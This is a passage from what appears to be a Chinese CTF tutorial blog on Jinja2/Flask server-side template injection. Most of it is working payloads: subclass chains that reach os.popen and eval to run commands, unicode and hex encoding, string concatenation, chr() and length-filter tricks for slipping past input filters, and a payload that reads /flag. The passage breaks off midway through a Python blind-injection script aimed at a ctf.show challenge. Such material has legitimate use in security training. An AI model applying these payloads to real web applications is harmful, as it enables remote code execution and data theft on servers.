</span></span><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;__builtins__&#39;</span><span class=p>][</span><span class=s1>&#39;eval&#39;</span><span class=p>]</span> <span class=p>(</span><span class=s1>&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>77</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;</span><span class=se>\u006f\u0073</span><span class=s1>&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\u006c\u0073\u0020</span><span class=s1>\u002 f&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</span></span><span class=line><span class=cl><span class=o>//</span><span class=n>等同于</span>
</span></span><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>77</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;os&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;ls /&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</span></span></code></pre></div><p>hex 编码绕过</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=vm>__bases__</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>59</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;</span><span class=se>\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f</span><span class=s1>\ x5f&#39;</span><span class=p>][</span><span class=s1>&#39;</span><span class=se>\x65\x76\x61\x6c</span><span class=s1>&#39;</span><span class=p>](</span><span class=s1>&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;</span><span class=p>)}}</span>
</span></span><span class=line><span class=cl><span class=p>{{()</span><span class=o>.</span><span class=vm>__class__</span><span class=o>.</span><span class=n>__base__</span><span class=o>.</span><span class=n>__subclasses__</span><span class=p>()</span> <span class=p>[</span><span class=mi>77</span><span class=p>]</span><span class=o>.</span><span class=fm>__init__</span><span class=o>.</span><span class=vm>__globals__</span><span class=p>[</span><span class=s1>&#39;</span><span class=se>\x6f\x73</span><span class=s1>&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>popen</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\x6c\x73\x20\x2f</span><span class=s1>&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()}}</span>
</span></span></code></pre></div><h4 id=字符串拼接 class=headerLink><a href=#%e5%ad%97%e7%ac%a6%e4%b8%b2%e6%8b%bc%e6%8e%a5 class=header-mark></a>字符串拼接</h4><p><code>'__cl'+'ass__'``'__cl''ass__'</code></p><h4 id=使用jinja2中的进行拼接 class=headerLink><a href=#%e4%bd%bf%e7%94%a8jinja2%e4%b8%ad%e7%9a%84%e8%bf%9b%e8%a1%8c%e6%8b%bc%e6%8e%a5 class=header-mark></a>使用Jinja2中的<code>~</code>进行拼接</h4><p><code>{%set a="__cla"%}{%set b="ss__"%}{{a~b}}</code></p><h4 id=使用过滤器reverse反转replace替换join拼接等 class=headerLink><a href=#%e4%bd%bf%e7%94%a8%e8%bf%87%e6%bb%a4%e5%99%a8reverse%e5%8f%8d%e8%bd%acreplace%e6%9b%bf%e6%8d%a2join%e6%8b%bc%e6%8e%a5%e7%ad%89 class=header-mark></a>使用过滤器(reverse反转、replace替换、join拼接等)</h4><p><code>{set a="__ssalc__"|reverse%}{{()[a]}}</code></p><p><code>{set a="__ssalc__"[::-1]%}{{()[a]}}</code></p><p><code>{set a="__claee__"|replace("ee","ss")%}{{()[a]}}</code></p><p><code>{%set a=dict(__cla=a,ss__=a)|join%}{{()[a]}}</code></p><p><code>{%set a=['__cla','ss__']|join%}{{()[a]}}</code></p><h4 id=利用python的chr class=headerLink><a href=#%e5%88%a9%e7%94%a8python%e7%9a%84chr class=header-mark></a>利用python的chr()</h4><p>由于不能直接使用 chr 函数，因此我们需要通过<code>__builtins__</code>来找到 chr</p><p><code>{%set chr=url_for.__globals__['__builtins__'].chr%}{{""[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(95)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}</code></p><p>这里贴一个脚本，用于快速构造 ascii 字符</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span> <span class=o>=</span> <span class=s1>&#39;whoami&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$result</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$a</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> 
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nv>$result</span> <span class=o>.=</span> <span class=s1>&#39;chr(&#39;</span><span class=o>.</span><span class=nx>ord</span><span class=p>(</span><span class=nv>$a</span><span class=p>[</span><span class=nv>$i</span><span class=p>])</span><span class=o>.</span><span class=s1>&#39;)%2b&#39;</span><span class=p>;</span> 
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$result</span><span class=p>,</span><span class=mi>0</span><span class=p>,</span><span class=o>-</span><span class=mi>3</span><span class=p>);</span> 
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><h3 id=过滤数字 class=headerLink><a href=#%e8%bf%87%e6%bb%a4%e6%95%b0%e5%ad%97 class=header-mark></a>过滤数字</h3><p>过滤器<code>length</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120004.jpeg title=de55241eb39dd8f485d9bb8d761b22d6_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120004.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120004.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120004.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120004.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120004.jpeg 2x" sizes=auto alt=de55241eb39dd8f485d9bb8d761b22d6_MD5></a></figure></p><p>通过length去构造我们所需要的数字</p><p><code>{%set a='aaaaaaaaaa'|length %}{{a}}</code> 10</p><p><code>{%set a='aaaaaaaaaa'|length*'aaa'|length %}{{a}}</code>30</p><p><code>{%set a='aaaaaaaaaa'|length*'aaa'|length-'aaa'|length %}{{a}}</code>117</p><p><strong>例题</strong></p><p>payload：<code>{{''.__class__.__base__.__subclasses__()[199].__init__.__globals__['os'].popen('ls /').read()}}</code></p><p>将数字替换后整段代码由两部分组成，第一部分构造数字，第二部分把数字替换成字母：</p><p><code>{%set a='aaaaaaaaaa'|length*'aaaaaaaaaa'|length*'aa'|length-'a'|length %}{{''.__class__.__base__.__subclasses__()[a].__init__.__globals__['os'].popen('ls /').read()}}</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120245.jpeg title=b24b0565bc0ac76b893b9186cf6cb4d0_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120245.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120245.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120245.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120245.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120245.jpeg 2x" sizes=auto alt=b24b0565bc0ac76b893b9186cf6cb4d0_MD5></a></figure></p><h3 id=混合过滤 class=headerLink><a href=#%e6%b7%b7%e5%90%88%e8%bf%87%e6%bb%a4 class=header-mark></a>混合过滤</h3><h4 id=获取字符串 class=headerLink><a href=#%e8%8e%b7%e5%8f%96%e5%ad%97%e7%ac%a6%e4%b8%b2 class=header-mark></a>获取字符串</h4><p><code>dict()</code>：用来创建一个字典</p><p><code>join</code>：将一个序列中的参数值拼接成字符串</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120323.jpeg title=c03fbf9aee5f112bde726948bf773d48_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120323.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120323.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120323.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120323.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120323.jpeg 2x" sizes=auto alt=c03fbf9aee5f112bde726948bf773d48_MD5></a></figure></p><p><code>{%set a=dict(benben=1)%}{{a}}</code>创建字典a，键名benben，键值1</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120340.jpeg title=9096ca32453fcf5190607348dbf91c60_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120340.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120340.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120340.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120340.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120340.jpeg 2x" sizes=auto alt=9096ca32453fcf5190607348dbf91c60_MD5></a></figure></p><p><strong>在无法使用引号的情况下，可使用</strong><code>**dict()**</code><strong>生成字典，配合</strong><code>**join**</code><strong>获得键名生成字符串</strong></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120411.jpeg title=278a23530046dbcd52f02913ae9ef415_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120411.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120411.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120411.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120411.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120411.jpeg 2x" sizes=auto alt=278a23530046dbcd52f02913ae9ef415_MD5></a></figure></p><p>使用 join 拼接出字符串 &ldquo;<strong>class</strong>"：</p><p><code>{%set a=dict(__cla=a,ss__=a)|join%}{{a}}</code>创建字典a，join把参数值拼接成字符串</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120548.jpeg title=3ef82c2d7ff76861d86dbbee95eb4bca_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120548.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120548.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120548.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120548.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120548.jpeg 2x" sizes=auto alt=3ef82c2d7ff76861d86dbbee95eb4bca_MD5></a></figure></p><h4 id=获取符号 class=headerLink><a href=#%e8%8e%b7%e5%8f%96%e7%ac%a6%e5%8f%b7 class=header-mark></a>获取符号</h4><p>利用flask内置函数和对象获取符号</p><p>使用list可拆分字符，从0计数</p><p><code>{%set a=({}|select()|string())|list%}{{a}}</code></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120556.jpeg title=1e6e243c6bf90d1d34c0f81f16d5fb37_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120556.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120556.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120556.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120556.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120556.jpeg 2x" sizes=auto alt=1e6e243c6bf90d1d34c0f81f16d5fb37_MD5></a></figure></p><p><code>{%set a=({}|select()|string())[24]%}{{a}}</code>第24位获取下划线</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120804.jpeg title=62d6c5913d15093bdf7b5e7d71844d51_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120804.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120804.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120804.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120804.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120804.jpeg 2x" sizes=auto alt=62d6c5913d15093bdf7b5e7d71844d51_MD5></a></figure></p><p><code>{%set a=(self|string())[18]%}{{a}}</code>获取空格</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120897.jpeg title=fa7f0f0326b28ed7657f52e6fbec4d6f_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120897.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120897.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120897.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120897.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120897.jpeg 2x" sizes=auto alt=fa7f0f0326b28ed7657f52e6fbec4d6f_MD5></a></figure></p><p><code>{%set a=(self|string|urlencode)[0]%}{{a}}</code>获取百分号</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120974.jpeg title=71b01d7a1799b6e5a28c3e5ac1375a5c_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120974.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120974.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120974.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120974.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120974.jpeg 2x" sizes=auto alt=71b01d7a1799b6e5a28c3e5ac1375a5c_MD5></a></figure></p><h4 id=实例 class=headerLink><a href=#%e5%ae%9e%e4%be%8b class=header-mark></a>实例</h4><h5 id=案例1 class=headerLink><a href=#%e6%a1%88%e4%be%8b1 class=header-mark></a>案例1</h5><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120003.jpeg title=608c9d8073dfd6411972d06d0aa17ccc_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120003.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120003.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120003.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120003.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120003.jpeg 2x" sizes=auto alt=608c9d8073dfd6411972d06d0aa17ccc_MD5></a></figure></p><h5 id=案例2 class=headerLink><a href=#%e6%a1%88%e4%be%8b2 class=header-mark></a>案例2</h5><p>获取数字</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120064.jpeg title=a12360eb2e830dc3d9a3c0fca3636c29_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120064.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120064.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120064.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120064.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120064.jpeg 2x" sizes=auto alt=a12360eb2e830dc3d9a3c0fca3636c29_MD5></a></figure></p><p>获取下划线，使用<code>pop</code>弹出字符</p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg title=b5d6ab598914b3003706a96b2835b1bf_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120225.jpeg 2x" sizes=auto alt=b5d6ab598914b3003706a96b2835b1bf_MD5></a></figure></p><p><figure><a class=lightgallery href=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120330.jpeg title=edb2d781d7dbc28bf7d6b3264d497093_MD5 data-thumbnail=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120330.jpeg><img loading=lazy src=https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120330.jpeg srcset="https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120330.jpeg, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120330.jpeg 1.5x, https://nexuzzz0-picture.oss-cn-hangzhou.aliyuncs.com/picture/202410152120330.jpeg 2x" sizes=auto alt=edb2d781d7dbc28bf7d6b3264d497093_MD5></a></figure></p><h5 id=web369 class=headerLink><a href=#web369 class=header-mark></a>web369</h5><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># &#39;&#39;.join(dict(po=a,p=a)) ==&gt; pop </span>
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>po</span><span class=o>=</span><span class=nb>dict</span><span class=p>(</span><span class=n>po</span><span class=o>=</span><span class=n>a</span><span class=p>,</span><span class=n>p</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>a</span><span class=o>=</span><span class=p>(()</span><span class=o>|</span><span class=n>select</span><span class=o>|</span><span class=n>string</span><span class=o>|</span><span class=nb>list</span><span class=p>)</span><span class=o>|</span><span class=n>attr</span><span class=p>(</span><span class=n>po</span><span class=p>)(</span><span class=mi>24</span><span class=p>)</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>ini</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=n>init</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>glo</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=nb>globals</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>geti</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=n>getitem</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>built</span><span class=o>=</span><span class=p>(</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=nb>dict</span><span class=p>(</span><span class=n>builtins</span><span class=o>=</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>,</span><span class=n>a</span><span class=p>,</span><span class=n>a</span><span class=p>)</span><span class=o>|</span><span class=n>join</span><span class=p>()</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>x</span><span class=o>=</span><span class=p>(</span><span class=n>q</span><span class=o>|</span><span class=n>attr</span><span class=p>(</span><span class=n>ini</span><span class=p>)</span><span class=o>|</span><span class=n>attr</span><span class=p>(</span><span class=n>glo</span><span class=p>)</span><span class=o>|</span><span class=n>attr</span><span class=p>(</span><span class=n>geti</span><span class=p>))(</span><span class=n>built</span><span class=p>)</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=nb>chr</span><span class=o>=</span><span class=n>x</span><span class=o>.</span><span class=n>chr</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span> <span class=nb>set</span> <span class=n>file</span><span class=o>=</span><span class=nb>chr</span><span class=p>(</span><span class=mi>47</span><span class=p>)</span><span class=o>%</span><span class=mi>2</span><span class=n>bchr</span><span class=p>(</span><span class=mi>102</span><span class=p>)</span><span class=o>%</span><span class=mi>2</span><span class=n>bchr</span><span class=p>(</span><span class=mi>108</span><span class=p>)</span><span class=o>%</span><span class=mi>2</span><span class=n>bchr</span><span class=p>(</span><span class=mi>97</span><span class=p>)</span><span class=o>%</span><span class=mi>2</span><span class=n>bchr</span><span class=p>(</span><span class=mi>103</span><span class=p>)</span><span class=o>%</span><span class=p>}</span> 
</span></span><span class=line><span class=cl><span class=p>{</span><span class=o>%</span><span class=nb>print</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>open</span><span class=p>(</span><span class=n>file</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>())</span><span class=o>%</span><span class=p>}</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># -*- coding: utf-8 -*- </span>
</span></span><span class=line><span class=cl><span class=c1># 盲注 </span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span> 
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>string</span> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>ccchr</span><span class=p>(</span><span class=n>s</span><span class=p>):</span> 
</span></span><span class=line><span class=cl>    <span class=n>t</span><span class=o>=</span><span class=s1>&#39;&#39;</span> 
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)):</span> 
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>i</span><span class=o>&lt;</span><span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>+=</span><span class=s1>&#39;chr(&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span><span class=o>+</span><span class=s1>&#39;)%2b&#39;</span> 
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span> 
</span></span><span class=line><span class=cl>            <span class=n>t</span><span class=o>+=</span><span class=s1>&#39;chr(&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=nb>ord</span><span class=p>(</span><span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]))</span><span class=o>+</span><span class=s1>&#39;)&#39;</span> 
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>t</span> 
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span><span class=s1>&#39;&#39;&#39;http://b134fd30-bddc-4302-8578-8005b96f73c2.chall.ctf.show/?name= 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et a=(()|select|string|list).pop(24)%} 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et ini=(a,a,dict(init=a)|join,a,a)|join()%} 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et glo=(a,a,dict(globals=a)|join,a,a)|join()%} 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et geti=(a,a,dict(getitem=a)|join,a,a)|join()%} 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et built=(a,a,dict(builtins=a)|join,a,a)|join()%} 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et x=(q|attr(ini)|attr(glo)|attr(geti))(built)%} 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et chr=x.chr%} {</span><span class=si>% s</span><span class=s1>et cmd=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%} 
</span></span></span><span class=line><span class=cl><span class=s1>{</span><span class=si>% s</span><span class=s1>et cmd2=&#39;&#39;&#39;</span> 
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=o>=</span><span class=n>string</span><span class=o>.</span><span class=n>digits</span><span class=o>+</span><span class=n>string</span><span class=o>.</span><span class=n>ascii_lowercase</span><span class=o>+</span><span class=s1>&#39;{_-}&#39;</span> 
</span></span><span class=line><span class=cl><span class=n>flag</span><span class=o>=</span><span class=s1>&#39;&#39;</span> 
